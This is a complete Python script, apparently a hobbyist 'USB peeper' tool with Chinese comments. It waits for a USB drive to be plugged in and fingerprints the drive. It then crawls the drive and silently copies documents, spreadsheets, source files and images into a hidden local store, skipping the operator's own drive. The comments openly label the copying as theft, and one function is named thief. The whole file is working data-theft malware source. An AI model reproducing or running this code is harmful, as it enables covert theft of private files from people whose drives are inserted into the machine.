'''
Name:U盘窥视者
'''


#导入必要库
import os
import time,datetime
import shutil
import configparser
import base64


#配置文件初始化
config = configparser.ConfigParser()  
config.read("config.ini")

#初始设定
nowtime = time.strftime("%Y-%m-%d") #日志生成时间
runtime = "["+time.strftime("%H:%M:%S")+']' #命令运行时间 
oldcode = [] #初始特征码   
disk = "h:\\" #U盘所在盘符  
save = "E:\\BlackTechnology\\USBwatcher\\Save\\" #窃取文件储存路径  
num = 0 #程序运行次数
partlist = ['.doc','.docx','.ppt','.pptx','.c','.txt','.pdf','.xls','.xlsx','.jpg','.jpeg','.png','.psd'] #初始窃取后缀列表
new_partlist = ".doc,.docx,.ppt,.pptx,.c,.txt,.pdf,.xls,.xlsx,.jpg,.jpeg,.png,.psd" #配置读取初始列表
sleeptime = 10 #睡眠时间
log_path = 'E:\\BlackTechnology\\USBwatcher\\log\\' #日志存储目录
copysize = 3 #单个文件大小上限(mb)
visible = 1 #控制台可视化
flag_sameusb=0  #相同U盘检测
  


#获取时间
def gettime():
    global runtime
    runtime = "["+time.strftime("%H:%M:%S")+']'
    nowtime = time.strftime("%Y-%m-%d")
    return runtime

#爬虫模块
def spider(disk):
    global num,log_name
    log_name = log_name +'-'+ str(num)
    try:
        print(gettime()+'正在启动爬虫模块....')
        time.sleep(5)   
        if not os.path.exists(log_path): 
            os.makedirs(log_path)
            #写日志文件
        log = open(log_name+'.txt','w',encoding='utf-8')
        print(gettime()+'爬虫模块运行中...')
        time.sleep(5)   
        #爬虫
        for(root,dirs,files) in os.walk(disk):
            cnum=len(root)
            log.write('\n'+"#"* cnum + '#' +"\n")
            log.write(root)
            log.write('\n'+"#"* cnum + '#' +"\n")
            for file in files:
                filename = os.path.join(root,file)
                log.write(filename+"\n")
        log.close()
        cnum = cnum + 1
        print(gettime()+'日志信息创建完毕.')
        time.sleep(5)
    except :
        pass   

#复制模块        
def thief(disk):
    try:
        global save,copysize,num
        print(gettime()+"正在启动复制模块...")
        time.sleep(10)
        save = save+str(num)  
        os.makedirs(save)
        for(root,dirs,files) in os.walk(disk):
            for file in files:
                filename = os.path.join(root,file)
                part = os.path.splitext(file)
                size = os.path.getsize(filename)
                size = size / (1024*1024)
                #print(filename+':'+str(size)+'\n')
                #print(part[1],part)
                if part[1] in partlist and size <= copysize:
                    if os.path.exists(os.path.join(save,root[3:])):
                        shutil.copyfile(filename,os.path.join(save,root[3:],file))
                        #print(os.path.join(save,root[3:],file))
                    else:
                        os.makedirs(os.path.join(save,root[3:]))
                        #print(os.path.join(save,root[3:],file))
                        shutil.copyfile(filename,os.path.join(save,root[3:],file))
                    print(gettime()+'正在复制',file)
                                    
                else:
                    print(gettime()+'忽略文件',file)
    except:
        pass


#U盘特征判断
def USBif():
    global num
    global oldcode
    if os.path.isfile(os.path.join(disk,'a.ico')):
        print(gettime()+"检测到自用U盘..")
        return 0
    codenum = 1 #
    strcode = ''.join(os.listdir(disk))
    strcode = strcode.encode(encoding="utf-8")
    newcode = str(base64.b64encode(strcode))[3:11]
    print(gettime()+'获取到新特征码',newcode)
    while(codenum<=int(num)):
        getcode = config.get("Database",str(codenum))
        print(gettime()+'检索到特征码',getcode)    
        if getcode == newcode:
            print(gettime()+'检测到与配置文件中匹配的U盘特征.')            
            return 0
        else:
            codenum = codenum +1  
    
    config.set("Database",str(int(num)+1),newcode)
    config.write(open('config.ini','w'))
    print(gettime()+"检测到新U盘并写入特征.")
                              
    return 1
    
    '''
    
    if len(newcode) == len(oldcode):        
        return 0
    else:
        oldcode = newcode
        log_name = log_name +'-'+ str(num)
        num = num +1
    '''

    
#print(os.listdir('.'))

#读取配置
def readconfig():
    print(gettime()+'正在读取配置文件....')
    if os.path.isfile(".\\config.ini") == True:
        try:    
            global disk,save,copysize,sleeptime,partlist,log_path,num
            config_disk = config.get("Setting","Disk")
            config_save = config.get("Setting",'Save')
            config_partlist = config.get("Setting","Partlist")
            config_sleeptime = config.get("Setting","Sleeptime")
            config_visible = config.get("Setting","Visible")
            config_size = config.get('Setting','Size')
            config_logpath = config.get("Setting","Log")
            config_num = config.get("Setting",'Num')
            #print(config_disk,config_save,config_partlist,config_sleeptime,config_visible)
            disk = config_disk
            save = config_save
            copysize = float(config_size)
            #print(config_size,copysize,disk,save)
            sleeptime = config_sleeptime
            partlist = config_partlist.split(",")
            log_path = config_logpath
            num = config_num
            #print(disk,save,partlist)
        except configparser.NoSectionError:
            print(gettime()+"配置文件有误..重新生成config.ini")
            os.remove('config.ini')
            readconfig()
    else:
        print(gettime()+'正在生成新的配置文件...')
        time.sleep(5)        
        cfg=open('config.ini','w+')
        config.read('.config.ini')
        config.add_section("Setting")
        config.set("Setting",'Disk',disk)
        config.set("Setting",'Save',save)
        config.set("Setting",'Partlist',new_partlist)
        config.set("Setting",'Sleeptime',str(sleeptime))
        config.set("Setting",'Visible',str(visible))
        config.set("Setting",'Size',str(copysize))
        config.set("Setting",'Log',log_path)
        config.set('Setting','num',str(num))
        config.add_section('Database')
        config.set('Database','1','NULL')        
        config.write(cfg)
        cfg.close()
        print(gettime()+"配置文件生成完毕.")

    '''
        fileconfig = open("config.ini",'r')
        disk=fileconfig.readline()[:-1]
        save=fileconfig.readline()[:-1]
        partlist=fileconfig.readline().split(",")[:-1] 
    '''
    

readconfig()
while (1):
    
    while (os.path.exists(disk) == True):
        
        log_name = log_path + nowtime
        if USBif():
            
            spider(disk)
            thief(disk)
            num=int(num)+1
            print(gettime()+'更新配置信息...')
            time.sleep(5)
            #num = int(num) + 1
            cfg=open('config.ini','w')
            config.set('Setting','num',str(num))
            config.write(cfg)
            cfg.close()
            print(gettime()+'配置信息更新完毕.')   
            
        else:
            #print(gettime()+'')
            flag_sameusb =1
            time.sleep(5)   
            break
    if flag_sameusb==0:
        print(gettime()+"没有检测到U盘.程序进入休眠状态，时间为",sleeptime,"s")
    else:
        print(gettime()+"程序进入休眠状态，时间为",sleeptime,"s")
        flag_sameusb = 0
    time.sleep(float(sleeptime))




            
         
                                

